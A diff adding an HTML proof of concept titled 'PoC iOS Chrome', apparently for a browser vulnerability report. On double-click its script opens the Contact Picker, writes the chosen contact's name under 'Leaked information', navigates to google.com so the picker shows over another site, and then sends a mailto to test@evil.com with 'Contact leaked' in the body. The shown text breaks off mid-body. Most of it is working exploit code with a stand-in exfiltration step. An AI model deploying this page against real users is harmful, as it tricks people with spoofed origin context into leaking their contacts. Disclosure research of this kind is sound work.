@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>PoC iOS Chrome</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+
+    <script>
+        document.ondblclick = async () => {
+            try {
+                // Contact Picker
+                let contacts = await navigator.contacts.select(
+                    ["name"],
+                    { multiple: false }
+                );
+
+                document.write(`
+                    <h1>
+                        <font color="red">Leaked information:</font><br>
+                        ${contacts[0].name}
+                    </h1>
+                `);
+
+                // Cross-origin navigation
+                window.location.href = "https://www.google.com";
+
+                // mailto trigger (iOS Chrome friendly)
+                setTimeout(() => {
+                    location.href = "mailto:test@evil.com?subject=PoC&body=Contact%20leaked";
+                }, 100);
+
+            } catch (e) {
+                alert("Failed: " + e);
+            }
+        };
+    </script>
+</head>
+
+<body>
+    <br><br><br>
+    <center>
+        <h1>
+            Double-click anywhere<br>
+            Contact Picker over google.com
+        </h1>
